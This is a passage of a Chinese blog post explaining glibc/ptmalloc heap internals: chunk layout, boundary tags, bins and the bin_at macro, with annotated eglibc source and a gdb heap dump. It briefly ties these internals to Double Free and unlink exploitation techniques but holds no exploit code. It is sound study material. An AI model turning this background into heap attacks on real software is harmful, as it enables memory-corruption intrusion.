class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c:<span class="number">1094</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  -----------------------  Chunk representations -----------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个 chunk 的完整结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   malloc_chunk details:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    (The following includes lightly edited explanations by Colin Plumb.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // chunk 的内存管理采用边界标识的方法, 空闲 chunk 的 size 在该 chunk 的 size 字段和下一个 chunk 的 pre_size 字段都有记录</span></span><br><span class="line"><span class="comment">    Chunks of memory are maintained using a `boundary tag&#x27; method as</span></span><br><span class="line"><span class="comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span></span><br><span class="line"><span class="comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span></span><br><span class="line"><span class="comment">    survey of such techniques.)  Sizes of free chunks are stored both</span></span><br><span class="line"><span class="comment">    in the front of each chunk and at the end.  This makes</span></span><br><span class="line"><span class="comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span></span><br><span class="line"><span class="comment">    size fields also hold bits representing whether chunks are free or</span></span><br><span class="line"><span class="comment">    in use.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An allocated chunk looks like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // 正在使用的 chunk 布局</span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">      |             Size of previous chunk, if allocated            | |</span></span><br><span class="line"><span class="comment">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">      |             Size of chunk, in bytes                       |M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">      |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">      .                                                               .</span></span><br><span class="line"><span class="comment">      .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">      .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">      |             Size of chunk                                     |</span></span><br><span class="line"><span class="comment">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // 几个术语规定, &#x27;chunk&#x27; 就是整个 chunk 开头, &#x27;mem&#x27; 就是用户数据的开始, &#x27;Nextchunk&#x27; 就是下一个 chunk 的开头</span></span><br><span class="line"><span class="comment">    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of</span></span><br><span class="line"><span class="comment">    the malloc code, but &quot;mem&quot; is the pointer that is returned to the</span></span><br><span class="line"><span class="comment">    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // chunk 是双字长对齐</span></span><br><span class="line"><span class="comment">    Chunks always begin on even word boundaries, so the mem portion</span></span><br><span class="line"><span class="comment">    (which is returned to the user) is also on an even word boundary, and</span></span><br><span class="line"><span class="comment">    thus at least double-word aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // 空闲 chunk 被存放在双向环链表</span></span><br><span class="line"><span class="comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">      |             Size of previous chunk                            |</span></span><br><span class="line"><span class="comment">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `head:&#x27; |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">      |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">      |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">      |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">      .                                                               .</span></span><br><span class="line"><span class="comment">      .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `foot:&#x27; |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // P 标志位不能放在 size 字段的低位字节, 用于表示前一个 chunk 是否在被使用, 如果为 0, 表示前一个 chunk 空闲, 同时 pre_size 也表示前一个空闲 chunk 的大小, 可以用于找到前一个 chunk 的地址, 方便合并空闲 chunk, 但 chunk 刚一开始分配时默认 P 为 1. 如果 P 标志位被设置, 也就无法获取到前一个 chunk 的 size, 也就拿不到前一个 chunk 地址, 也就无法修改正在使用的 chunk, 但是这是无法修改前一个 chunk, 但是可以通过本 chunk 的 size 获得下一个 chunk 的地址. </span></span><br><span class="line"><span class="comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span></span><br><span class="line"><span class="comment">    chunk size (which is always a multiple of two words), is an in-use</span></span><br><span class="line"><span class="comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span></span><br><span class="line"><span class="comment">    word before the current chunk size contains the previous chunk</span></span><br><span class="line"><span class="comment">    size, and can be used to find the front of the previous chunk.</span></span><br><span class="line"><span class="comment">    The very first chunk allocated always has this bit set,</span></span><br><span class="line"><span class="comment">    preventing access to non-existent (or non-owned) memory. If</span></span><br><span class="line"><span class="comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span></span><br><span class="line"><span class="comment">    the size of the previous chunk, and might even get a memory</span></span><br><span class="line"><span class="comment">    addressing fault when trying to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Note that the `foot&#x27; of the current chunk is actually represented</span></span><br><span class="line"><span class="comment">    as the prev_size of the NEXT chunk. This makes it easier to</span></span><br><span class="line"><span class="comment">    deal with alignments etc but can be very confusing when trying</span></span><br><span class="line"><span class="comment">    to extend or adapt this code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The two exceptions to all this are</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // 这里的 the trailing size 是指下一个 chunk 的 pre_size, 因为 top 位于最高地址, 不存在相邻的下一个 chunk, 同时这里也解答了上面关于 top 什么时候重新填满</span></span><br><span class="line"><span class="comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span></span><br><span class="line"><span class="comment">  trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">  that would have to index off it. After initialization, `top&#x27;</span></span><br><span class="line"><span class="comment">  is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">  MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">  bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">  allocated one-by-one, each must contain its own trailing size field.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><br><code>P (PREV_INUSE)</code> 标志位表示前一个 chunk 是否在使用, 0 为没有在使用.</p><p><code>prev_size</code> 表示前一个 chunk 的大小, 仅在<code>P (PREV_INUSE)</code>为 0 时有效, 也就是前一个 chunk 为空闲状态.</p><p><code>size</code> 表示该整个 chunk 大小, 并非 malloc 返回值.</p><p><code>fd</code>, <code>bk</code>, <code>fd_nextsize</code>,<code>fd_nextsize</code>是对于空闲 chunk 而言, 对于正在使用的 chunk, 从当前位置开始就是 malloc 返回给用户可用的空间.</p><p><code>fd</code>, <code>bk</code> 组成了<code>Bins</code>的双向环链表</p><p>对于空闲的 chunk 空间布局, 见上, 是环形双向链表. 存放在空闲 chunk 容器中.</p><p>关于 chunk 有一些操作, 判断前一个是否在使用, 判断下一个 chunk 是否正在使用, 是不是 <code>mmap</code> 分配的, 以及对标志位 P 等的操作.</p><h1 id="边界标示"><a href="#边界标示" class="headerlink" title="边界标示"></a>边界标示</h1><p>对于 chunk 的空间布局组织采用边界标示的方法, chunk 的存储是一段连续的内存, 其实就是 chunk 头部保存长度信息, 可以在适当的时候获取到前一个和后一个 chunk.</p><p>这里涉及到 chunk 到用户请求 mem 的想换转化操作, 以及对齐操作等. </p><h1 id="空间复用"><a href="#空间复用" class="headerlink" title="空间复用"></a>空间复用</h1><p>对于正在使用 chunk, 它的下一个 chunk 的<code>prev_size</code>是无效的, 所以这块内存被当前 chunk 给借用了, 因此对于请求分配 chunk 大小分配公式是<code>chunk_size = (用户请求大小 + (2 - 1) * sizeof(INTERNAL_SIZE_T)) align to 2 * sizeof(size_t)</code></p><p>最后参考 eglibc-2.19/malloc/malloc.c:44, 会指出一些默认参数值, 以及关于 chunk 的最小 size 和 对齐的相关说明. 这里列出一小部分.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Supported pointer representation:       <span class="number">4</span> or <span class="number">8</span> bytes</span><br><span class="line">  Supported <span class="type">size_t</span>  representation:       <span class="number">4</span> or <span class="number">8</span> bytes</span><br><span class="line">       Note that <span class="type">size_t</span> is allowed to be <span class="number">4</span> bytes even <span class="keyword">if</span> pointers are <span class="number">8.</span></span><br><span class="line">       You can adjust this by defining INTERNAL_SIZE_T</span><br><span class="line"></span><br><span class="line">  Alignment:                              <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">size_t</span>) (<span class="keyword">default</span>)</span><br><span class="line">       (i.e., <span class="number">8</span> byte alignment with <span class="number">4b</span>yte <span class="type">size_t</span>). This suffices <span class="keyword">for</span></span><br><span class="line">       nearly all current machines and C compilers. However, you can</span><br><span class="line">       define MALLOC_ALIGNMENT to be wider than this <span class="keyword">if</span> necessary.</span><br><span class="line"></span><br><span class="line">  Minimum overhead per allocated chunk:   <span class="number">4</span> or <span class="number">8</span> bytes</span><br><span class="line">       Each malloced chunk has a hidden word of overhead holding size</span><br><span class="line">       and status information.</span><br><span class="line"></span><br><span class="line">  Minimum allocated size: <span class="number">4</span>-byte ptrs:  <span class="number">16</span> bytes    (including <span class="number">4</span> overhead)</span><br><span class="line">              <span class="number">8</span>-byte ptrs:  <span class="number">24</span>/<span class="number">32</span> bytes (including, <span class="number">4</span>/<span class="number">8</span> overhead)</span><br><span class="line"></span><br><span class="line">       When a chunk is freed, <span class="number">12</span> (<span class="keyword">for</span> <span class="number">4b</span>yte ptrs) or <span class="number">20</span> (<span class="keyword">for</span> <span class="number">8</span> byte</span><br><span class="line">       ptrs but <span class="number">4</span> byte size) or <span class="number">24</span> (<span class="keyword">for</span> <span class="number">8</span>/<span class="number">8</span>) additional bytes are</span><br><span class="line">       needed; <span class="number">4</span> (<span class="number">8</span>) <span class="keyword">for</span> a trailing size field and <span class="number">8</span> (<span class="number">16</span>) bytes <span class="keyword">for</span></span><br><span class="line">       <span class="built_in">free</span> <span class="built_in">list</span> pointers. Thus, the minimum allocatable size is</span><br><span class="line">       <span class="number">16</span>/<span class="number">24</span>/<span class="number">32</span> bytes.</span><br><span class="line"></span><br><span class="line">       Even a request <span class="keyword">for</span> zero <span class="title function_">bytes</span> <span class="params">(i.e., <span class="built_in">malloc</span>(<span class="number">0</span>))</span> returns a</span><br><span class="line">       pointer to something of the minimum allocatable size.</span><br><span class="line"></span><br><span class="line">       The maximum overhead <span class="title function_">wastage</span> <span class="params">(i.e., number of extra bytes</span></span><br><span class="line"><span class="params">       allocated than were requested in <span class="built_in">malloc</span>)</span> is less than or equal</span><br><span class="line">       to the minimum size, except <span class="keyword">for</span> requests &gt;= mmap_threshold that</span><br><span class="line">       are serviced via <span class="title function_">mmap</span><span class="params">()</span>, where the worst <span class="keyword">case</span> wastage is 2 *</span><br><span class="line">       <span class="title function_">sizeof</span><span class="params">(<span class="type">size_t</span>)</span> bytes plus the remainder from a system <span class="title function_">page</span> <span class="params">(the</span></span><br><span class="line"><span class="params">       minimal mmap unit)</span>; typically <span class="number">4096</span> or <span class="number">8192</span> bytes.</span><br></pre></td></tr></table></figure><br>翻译几个关键的点, chunk 的大小需要按照 Alignment 进行对齐, 每一个被分配的 chunk 都有一个字的头部消耗, 包含该 chunk 的大小以及状态信息, 具体会在 chunk 结构和边界标示说明.</p><h1 id="空闲容器-缓存"><a href="#空闲容器-缓存" class="headerlink" title="空闲容器(缓存)"></a>空闲容器(缓存)</h1><p>下面会介绍 ptmalloc 中存在的各种空闲容器</p><p>Bins<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c:<span class="number">1341</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   -------------------- Internal data structures --------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   All internal state is held in an instance of malloc_state defined</span></span><br><span class="line"><span class="comment">   below. There are no other static variables, except in two optional</span></span><br><span class="line"><span class="comment">   cases:</span></span><br><span class="line"><span class="comment"> * If USE_MALLOC_LOCK is defined, the mALLOC_MUTEx declared above.</span></span><br><span class="line"><span class="comment"> * If mmap doesn&#x27;t support MAP_ANONYMOUS, a dummy file descriptor</span></span><br><span class="line"><span class="comment">     for mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Beware of lots of tricks that minimize the total bookkeeping space</span></span><br><span class="line"><span class="comment">   requirements. The result is a little over 1K bytes (for 4byte</span></span><br><span class="line"><span class="comment">   pointers and size_t.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bins</span></span><br><span class="line"><span class="comment">    // Bins 就是由空闲 chunk - bin 组成数组, 每一个 bin 都是双向链表. Bin 存放是整理过的 chunks, 并且 bin 中合并过的空闲 chunk 是不存在相邻的, 所以 bin 中的每一个 chunk 都是可以被使用, 并且都是紧挨着正在使用的 chunk 或者 heap  内存末尾.</span></span><br><span class="line"><span class="comment">    An array of bin headers for free chunks. Each bin is doubly</span></span><br><span class="line"><span class="comment">    linked.  The bins are approximately proportionally (log) spaced.</span></span><br><span class="line"><span class="comment">    There are a lot of these bins (128). This may look excessive, but</span></span><br><span class="line"><span class="comment">    works very well in practice.  Most bins hold sizes that are</span></span><br><span class="line"><span class="comment">    unusual as malloc request sizes, but are more usual for fragments</span></span><br><span class="line"><span class="comment">    and consolidated sets of chunks, which is what these bins hold, so</span></span><br><span class="line"><span class="comment">    they can be found quickly.  All procedures maintain the invariant</span></span><br><span class="line"><span class="comment">    that no consolidated chunk physically borders another one, so each</span></span><br><span class="line"><span class="comment">    chunk in a list is known to be preceeded and followed by either</span></span><br><span class="line"><span class="comment">    inuse chunks or the ends of memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // bins 中的 chunk 是按照大小排序的. FIFO, small bins 是不存在按大小排序的, 因为每一个 small bin 都是相同 size 的. 但是对于 large bin 是需要按照顺序插入的. 这样可以在内存分配时很快查找到合适内存.</span></span><br><span class="line"><span class="comment">    Chunks in bins are kept in size order, with ties going to the</span></span><br><span class="line"><span class="comment">    approximately least recently used chunk. Ordering isn&#x27;t needed</span></span><br><span class="line"><span class="comment">    for the small bins, which all contain the same-sized chunks, but</span></span><br><span class="line"><span class="comment">    facilitates best-fit allocation for larger chunks. These lists</span></span><br><span class="line"><span class="comment">    are just sequential. Keeping them in order almost never requires</span></span><br><span class="line"><span class="comment">    enough traversal to warrant using fancier ordered data</span></span><br><span class="line"><span class="comment">    structures.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    // FIFO, 从头部插入节点, 尾部取节点. 这样有个特定就是更容易内存的合并.</span></span><br><span class="line"><span class="comment">    Chunks of the same size are linked with the most</span></span><br><span class="line"><span class="comment">    recently freed at the front, and allocations are taken from the</span></span><br><span class="line"><span class="comment">    back.  This results in LRU (FIFO) allocation order, which tends</span></span><br><span class="line"><span class="comment">    to give each chunk an equal opportunity to be consolidated with</span></span><br><span class="line"><span class="comment">    adjacent freed chunks, resulting in larger free chunks and less</span></span><br><span class="line"><span class="comment">    fragmentation.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To simplify use in double-linked lists, each bin header acts</span></span><br><span class="line"><span class="comment">    as a malloc_chunk. This avoids special-casing for headers.</span></span><br><span class="line"><span class="comment">    But to conserve space and improve locality, we allocate</span></span><br><span class="line"><span class="comment">    only the fd/bk pointers of bins, and then use repositioning tricks</span></span><br><span class="line"><span class="comment">    to treat these as the fields of a malloc_chunk*.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><br>ptmalloc 采用分箱式管理空闲 chunk, 也就是 Bins. Bins 本身就是一个数组, 每一个存放的是一个对应长度的 chunk 双向环链表的头结点和尾节点. 相同 Size 的 chunk 才能组成一个环,Bins 是按大小依次进行存放.</p><p>关于 Bins 为什么定义为 <code>mchunkptr bins[NBINS * 2 - 2]</code>而不是 <code>mchunkptr bins[NBINS * 4 - 2]</code>, 是如何少一倍的空间实现的双向链表,大致说一下, 对于双向环的的标志头节点, 它的 <code>prev_size</code> 和 <code>size</code> 是无用的, 所以直接省略, 但是还要把它当成正确的 chunk 结构. 这里的<code>trick</code>就在于 <code>bin_at</code> 宏, 返回了伪造的 fake chunk 的地址, 这里和<code>Double Free</code>以及 <code>unlink</code>绕过的利用手法类似.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))               \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure></p><p>举一个例子, 只摘取一部分, 完整的例子, 在下方的 ptmalloc 利用部分.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查看 unsorted bin 的地址, 其实也就是 bin[<span class="number">1</span>] 的地址</span><br><span class="line">(gdb) heap -b</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line"></span><br><span class="line">unsorted bin @ <span class="number">0x7ffff7dd1b88</span></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x602160</span> - size <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x6020b0</span> - size <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x602000</span> - size <span class="number">0x90</span></span><br><span class="line"># 这里的 <span class="number">0x7ffff7dd1B78</span> 也就是 bin_at 返回的地址, 返回了一个伪造的 chunk 的地址</span><br><span class="line"># 其实这里的 fd 和 bk 才真正属于 bin[<span class="number">1</span>] 的内容.</span><br><span class="line">(gdb) p *(mfastbinptr)<span class="number">0x7ffff7dd1B78</span></span><br><span class="line">$<span class="number">17</span> = &#123;prev_size = <span class="number">6300176</span>, size = <span class="number">0</span>, fd = <span class="number">0x602160</span>, bk = <span class="number">0x602000</span>, fd_nextsize = <span class="number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="number">104</span>&gt;, bk_nextsize = <span class="number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="number">104</span>&gt;&#125;</span><br></pre></td></tr></table></figure></p><h1 id="small-bins-large-bins"><a href="#small-bins-large-bins" class="headerlink" title="small bins, large bins"></a>small bins, large bins</h1><p>对于 chunk <code>size &lt; 512</code>, 是存放在 small bins, 有 64 个, 每个 bin 是以 8 bytes 作为分割边界, 也就相当于等差序列, 举个例子: small bins 中存放的第一个<code>chunk 双向环链表</code>全部都是由 size 为 16 bytes 大小的 chunk 组成的, 第二个<code>chunk 双向环链表</code>都是由 size 为 16+8 bytes 大小的 chunk 组成的. 但是对于 large bins, 分割边界是递增的, 举个简单例子: 前 32 个 large bins 的分割边界都是 64 bytes, 之后 16 个 large bins 的分割边界是 512 bytes. 以上仅为字长为 32 位的情况下, 具体请参考如下.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c:<span class="number">1436</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what&#x27;s left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>large bin 有些特殊, 空闲 chunk 的存放需要排序, large_bin-&gt;bk 为最小 size 的 chunk, large_bin-&gt;fd 为最大 size 的 chunk.</p><h1 id="Fastbins-1"><a href="#Fastbins-1" 